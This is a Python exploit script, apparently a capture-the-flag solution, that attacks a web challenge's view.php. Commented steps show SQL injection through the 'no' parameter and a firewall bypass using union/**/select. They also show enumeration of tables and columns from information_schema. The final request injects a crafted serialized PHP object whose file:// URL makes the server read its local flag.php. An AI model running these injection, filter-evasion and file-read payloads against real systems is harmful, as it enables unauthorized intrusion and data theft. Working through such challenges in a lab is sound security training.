import requests

path = 'file:///var/www/html/flag.php'
obj = f'\'O:8:"UserInfo":3:{{s:4:"name";s:2:"hi";s:3:"age";i:12345;s:4:"blog";s:{len(path)}:"{path}";}}\''
url = 'http://8d3e5cc2c47948f0bf92fbf3ba83a648ac1a8b2b8a484814.game.ichunqiu.com/view.php'

# r = requests.get(url, params={'no': '1'})
# r = requests.get(url, params={'no': '2'})
# r = requests.get(url, params={'no': '2 or 1'}) 可以注入
# r = requests.get(url, params={'no': '2 union select 1,2,3'}) 防火墙
# r = requests.get(url, params={'no': '2 union'}) 不触发
# r = requests.get(url, params={'no': '2 select'}) 不触发
# r = requests.get(url, params={'no': '2 union/**/select 1,2,3'}) The used SELECT statements have a different number of columns
# r = requests.get(url, params={'no': '2 union/**/select 1,2,3,4'}) Unserialize()报错
# r = requests.get(url, params={'no': f"2 union/**/select {obj},{obj},{obj},{obj}"})
# r = requests.get(url, params={'no': f"2 union/**/select {obj},'name',{obj},{obj}"})
# r = requests.get(url, params={'no': f"2 union/**/select {obj},(select right((select group_concat(table_name) from information_schema.tables),100)),{obj},{obj}"})
# r = requests.get(url, params={'no': f"2 union/**/select {obj},(select group_concat(column_name) from information_schema.columns where table_name='table_c'),{obj},{obj}"})
# r = requests.get(url, params={'no': f"2 union/**/select {obj},(select count(*) from users),{obj},{obj}"})
r = requests.get(url, params={'no': f"2 union/**/select {obj},'<php>echo 1;<?php>',{obj},{obj}"})

print(r.text)
